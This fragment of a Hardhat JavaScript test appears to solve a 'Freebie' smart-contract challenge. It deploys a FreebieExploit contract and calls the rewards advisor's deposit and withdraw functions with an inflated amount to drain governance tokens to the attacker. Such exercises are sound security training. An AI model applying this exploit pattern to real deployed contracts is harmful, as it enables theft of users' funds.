...
before(async () => {
  ...
  let exploitFactory = await ethers.getContractFactory('FreebieExploit')
  exploit = await exploitFactory.connect(attacker).deploy()
...
it("solves the challenge", async function () {
  let balance = await govToken.connect(attacker).balanceOf(attacker.getAddress());
  console.log(balance);
  rewardsAdvisor.connect(attacker).deposit(precision.mul(100000000000000), exploit.address, exploit.address);
  balance = await govToken.connect(attacker).balanceOf(attacker.getAddress());
  console.log(balance);
  rewardsAdvisor.connect(attacker).withdraw(precision.mul(100000000000000), attacker.getAddress(), exploit.address);
});
